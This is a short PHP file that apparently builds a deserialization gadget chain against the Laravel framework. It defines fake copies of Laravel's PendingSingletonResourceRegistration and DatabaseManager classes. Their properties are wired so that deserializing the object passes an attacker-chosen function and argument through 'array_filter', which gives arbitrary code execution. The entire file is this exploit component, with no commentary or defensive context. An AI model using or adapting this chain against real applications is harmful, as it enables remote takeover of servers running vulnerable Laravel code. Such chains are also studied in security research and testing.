<?php

namespace Illuminate\Routing
{
    class PendingSingletonResourceRegistration
    {
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options;

        function __construct($function, $parameter) 
        {
            $this->name = "name";
            $this->options = [];
            $this->registrar = new \Illuminate\Database\DatabaseManager($function, $parameter);
            $this->controller = "controller";
        }
    }
}

namespace Illuminate\Database
{
    class DatabaseManager
    {
        protected $app;
        protected $factory;
        protected $extensions = [];

        function __construct($function, $parameter)
        {
            $this->app = [
                "config" => [
                    "database.default"  =>  $function,
                    "database.connections"  =>  [
                        $function  =>  "a{$parameter}"
                    ]
                ]
            ];
            $this->factory = "anything";
            $this->extensions[$function] = "array_filter";
        }
    }
}